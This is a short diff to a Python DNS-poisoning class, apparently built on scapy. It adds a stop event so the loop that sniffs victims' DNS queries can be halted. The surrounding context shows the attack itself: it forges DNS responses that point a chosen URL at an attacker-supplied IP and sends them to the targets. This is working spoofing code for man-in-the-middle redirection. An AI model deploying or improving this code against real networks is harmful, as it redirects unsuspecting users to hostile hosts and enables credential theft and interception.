@@ -9,7 +9,7 @@ class DnsPoisoning:
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison):
+    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, stop_event):
 
         def makeFakeResponse(pkt, ipVictim, url, ipPoison, interface):
             # check if the packet (is a DNS packet) AND (comes from the target)
@@ -33,7 +33,7 @@ class DnsPoisoning:
                             send(poisonPacket, verbose=0, iface=interface)
                             print("Fake packet sent")
 
-        while True:
+        while not stop_event.is_set():
             for ip in target1:
                 sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ip, url, ipPoison, self.interface),iface=self.interface)
 
